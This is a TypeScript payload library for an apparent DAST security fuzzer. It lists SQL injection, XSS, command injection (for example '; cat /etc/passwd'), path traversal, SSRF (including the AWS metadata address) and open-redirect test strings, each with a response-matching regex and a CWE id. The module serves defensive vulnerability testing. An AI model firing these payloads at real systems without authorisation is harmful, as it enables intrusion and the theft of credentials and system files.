/**
 * Security test payload generator for common vulnerability classes.
 * Used by the DAST fuzzer to test discovered endpoints.
 */

export interface TestPayload {
  category: string;
  name: string;
  value: string;
  detectPattern: RegExp;
  severity: "critical" | "high" | "medium";
  cwe: string;
}

export const SQL_INJECTION_PAYLOADS: TestPayload[] = [
  {
    category: "sqli",
    name: "Basic OR bypass",
    value: "' OR '1'='1",
    detectPattern: /error|sql|syntax|mysql|postgres|sqlite|oracle|ORA-/i,
    severity: "critical",
    cwe: "CWE-89",
  },
  {
    category: "sqli",
    name: "Union select",
    value: "' UNION SELECT NULL,NULL--",
    detectPattern: /error|column|union|select/i,
    severity: "critical",
    cwe: "CWE-89",
  },
  {
    category: "sqli",
    name: "Time-based blind",
    value: "'; WAITFOR DELAY '0:0:5'--",
    detectPattern: /./, // detect via response time
    severity: "critical",
    cwe: "CWE-89",
  },
  {
    category: "sqli",
    name: "Error-based",
    value: "' AND 1=CONVERT(int,(SELECT @@version))--",
    detectPattern: /convert|version|microsoft|sql server/i,
    severity: "critical",
    cwe: "CWE-89",
  },
];

export const XSS_PAYLOADS: TestPayload[] = [
  {
    category: "xss",
    name: "Basic script tag",
    value: '<script>alert("XSS")</script>',
    detectPattern: /<script>alert/i,
    severity: "high",
    cwe: "CWE-79",
  },
  {
    category: "xss",
    name: "Event handler",
    value: '" onmouseover="alert(1)" x="',
    detectPattern: /onmouseover/i,
    severity: "high",
    cwe: "CWE-79",
  },
  {
    category: "xss",
    name: "SVG injection",
    value: '<svg onload="alert(1)">',
    detectPattern: /<svg.*onload/i,
    severity: "high",
    cwe: "CWE-79",
  },
  {
    category: "xss",
    name: "Polyglot",
    value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A",
    detectPattern: /javascript|onclick|alert/i,
    severity: "high",
    cwe: "CWE-79",
  },
];

export const COMMAND_INJECTION_PAYLOADS: TestPayload[] = [
  {
    category: "cmdi",
    name: "Pipe command",
    value: "| id",
    detectPattern: /uid=\d+/i,
    severity: "critical",
    cwe: "CWE-78",
  },
  {
    category: "cmdi",
    name: "Semicolon chain",
    value: "; cat /etc/passwd",
    detectPattern: /root:.*:0:0/i,
    severity: "critical",
    cwe: "CWE-78",
  },
  {
    category: "cmdi",
    name: "Backtick execution",
    value: "`id`",
    detectPattern: /uid=\d+/i,
    severity: "critical",
    cwe: "CWE-78",
  },
];

export const PATH_TRAVERSAL_PAYLOADS: TestPayload[] = [
  {
    category: "path-traversal",
    name: "Unix passwd",
    value: "../../../etc/passwd",
    detectPattern: /root:.*:0:0/i,
    severity: "high",
    cwe: "CWE-22",
  },
  {
    category: "path-traversal",
    name: "Windows hosts",
    value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    detectPattern: /localhost|127\.0\.0\.1/i,
    severity: "high",
    cwe: "CWE-22",
  },
  {
    category: "path-traversal",
    name: "URL-encoded",
    value: "..%2f..%2f..%2fetc%2fpasswd",
    detectPattern: /root:.*:0:0/i,
    severity: "high",
    cwe: "CWE-22",
  },
];

export const SSRF_PAYLOADS: TestPayload[] = [
  {
    category: "ssrf",
    name: "Localhost probe",
    value: "http://127.0.0.1:80",
    detectPattern: /html|head|body|server/i,
    severity: "high",
    cwe: "CWE-918",
  },
  {
    category: "ssrf",
    name: "AWS metadata",
    value: "http://169.254.169.254/latest/meta-data/",
    detectPattern: /ami-id|instance-id|iam/i,
    severity: "critical",
    cwe: "CWE-918",
  },
  {
    category: "ssrf",
    name: "Internal network",
    value: "http://192.168.1.1",
    detectPattern: /html|router|login|admin/i,
    severity: "high",
    cwe: "CWE-918",
  },
];

export const OPEN_REDIRECT_PAYLOADS: TestPayload[] = [
  {
    category: "redirect",
    name: "External redirect",
    value: "https://evil.com",
    detectPattern: /./, // detect via Location header
    severity: "medium",
    cwe: "CWE-601",
  },
  {
    category: "redirect",
    name: "Protocol-relative",
    value: "//evil.com",
    detectPattern: /./,
    severity: "medium",
    cwe: "CWE-601",
  },
];

/**
 * Get all payloads for a given vulnerability category.
 */
export function getPayloads(category?: string): TestPayload[] {
  const all = [
    ...SQL_INJECTION_PAYLOADS,
    ...XSS_PAYLOADS,
    ...COMMAND_INJECTION_PAYLOADS,
    ...PATH_TRAVERSAL_PAYLOADS,
    ...SSRF_PAYLOADS,
    ...OPEN_REDIRECT_PAYLOADS,
  ];

  if (category) {
    return all.filter((p) => p.category === category);
  }
  return all;
}

/**
 * Generate targeted payloads based on a static analysis finding.
 */
export function generateTargetedPayloads(vulnCategory: string): TestPayload[] {
  switch (vulnCategory) {
    case "injection":
    case "sql-injection":
      return SQL_INJECTION_PAYLOADS;
    case "xss":
      return XSS_PAYLOADS;
    case "command-injection":
      return COMMAND_INJECTION_PAYLOADS;
    case "path-traversal":
      return PATH_TRAVERSAL_PAYLOADS;
    case "ssrf":
      return SSRF_PAYLOADS;
    case "redirect":
      return OPEN_REDIRECT_PAYLOADS;
    default:
      return [];
  }
}
